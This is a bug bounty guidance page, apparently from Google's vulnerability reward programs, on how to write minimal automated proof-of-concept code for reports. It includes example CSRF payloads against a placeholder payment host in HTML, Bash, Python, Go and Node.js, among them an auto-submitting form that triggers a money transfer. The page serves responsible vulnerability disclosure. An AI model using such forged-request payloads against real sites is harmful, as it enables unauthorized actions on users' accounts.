Including a great proof of concept (PoC) in your VRP report makes the
vulnerability you've discovered unambiguously clear and effortless to reproduce,
thus hastening the processing of your report and the decision on a potential
reward.

The following sections provide additional guidance for automated PoCs submitted
to the
[Abuse](https://bughunters.google.com/about/rules/google-friends/5238081279623168/abuse-vulnerability-reward-program-rules),
[Cloud](https://bughunters.google.com/about/rules/google-friends/4849867320328192/cloud-vulnerability-reward-program-rules),
and
[Google](https://bughunters.google.com/about/rules/google-friends/6625378258649088/google-and-alphabet-vulnerability-reward-program-vrp-rules)
VRPs in order to help you fulfill the bar for exceptional quality reports (see
e.g.
[report quality guidance](https://bughunters.google.com/about/rules/google-friends/6625378258649088/google-and-alphabet-vulnerability-reward-program-vrp-rules#report-quality)
for the Google VRP).

## Traits we like to see in automated PoCs

*   Can run in a Debian-based Linux environment like Google Cloud Shell. We will
    run your PoC in a sandboxed environment.
*   **Minimal** and self contained, avoiding dependencies outside core libraries
    when possible. For example, use the Python Requests library instead of less
    common HTTP libraries. We may ask you to rewrite your PoC if we cannot
    quickly and confidently verify the safety of the dependency(s) used.
*   Documented sufficiently for us to be able to understand what is being run
    and for what purpose to prove impact. This documentation can be inline or in
    your report.
    *   Extra points for including a
        [short video](/learn/improving-your-reports/how-to-report/5715986495569920/tips-for-uploading-a-video-with-your-poc)
        (unlisted on YouTube or hosted privately) demonstrating how your PoC
        should be run and the expected output 📽️
*   Allows us to use our own cookies/credentials etc. easily. We always use our
    own test accounts and cannot use yours.

## What we are <span style="text-decoration:underline;">NOT</span> looking for

*   Selenium or other browser-based automation. We are interested in the
    underlying API calls that caused a vulnerability. Additionally,
    browser-based automation presents a complex reproduction environment that
    can be complicated to share, especially with credentials involved.
*   Less common or lower level programming languages. **Try to keep it simple
    (HTML, Bash, Python, Golang, Node.js)**. Leave your COBOL expertise out of
    your report 🙂
*   Automation for exploits which require complex browser interaction. **If an
    automated PoC won’t be useful, don't include it and describe why.** A good
    example is DOM-based XSS where you need the browser to run JavaScript to
    trigger your exploit.
*   Added complexity unnecessary for proving impact. Automation to set up the
    needed environment is helpful, however, adding multiple exploits to one PoC
    to prove the same vulnerability is not necessary.

## Acceptable Languages & Examples

Note that other languages are welcome, but please try to keep your PoC simple.

### HTML

An example POC for a POST-based CSRF on paymentexample.google.com could be as
simple as:

```
<form action="https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true" method="POST" id="form">
</form>
<script>document.getElementById('form').submit()</script>
```

### Bash

A similar PoC, but written in Bash:

```
LOGIN_TOKEN="LOGIN_TOKEN"

curl "https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true"
-X POST -H "Cookie: session=${LOGIN_TOKEN}"
```

### Python

A similar PoC, but written in Python:

```
import requests

login_token ="LOGIN_TOKEN"
url = "https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true"
headers = {"Cookie": f"session={login_token}"}

response = requests.post(url, headers=headers)
print(response.text)
```

### Golang

A similar PoC, but written in Golang (error handling omitted):

```
package main

import (
    "fmt"
    "io"
    "net/http"
)

func main() {
    login_token := "LOGIN_TOKEN"
    url := "https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true"

    // setup the request
    req, _ := http.NewRequest(http.MethodPost, url, nil)

    // setup cookies
    cookieValue := fmt.Sprintf("session=%s", login_token)
    req.Header.Set("Cookie", cookieValue)

    // create HTTP client
    client := &http.Client{}
    resp, _ := client.Do(req)

    // print the response
    body, _ := io.ReadAll(resp.Body)
    fmt.Println("Response Body:", string(body))
}
```

### Node.js

A similar PoC, but written in Node.js:

```
const loginToken = "LOGIN_TOKEN";
const url = "https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true";

const headers = {
    "Cookie": `session=${loginToken}`
};

async function makeRequest() {
    try {
        const response = await fetch(url, {
            method: "POST",
            headers: headers
        });
        const responseText = await response.text();
        console.log(responseText);

    } catch (error) {
        console.error("Request error:", error);
    }
}

makeRequest();
```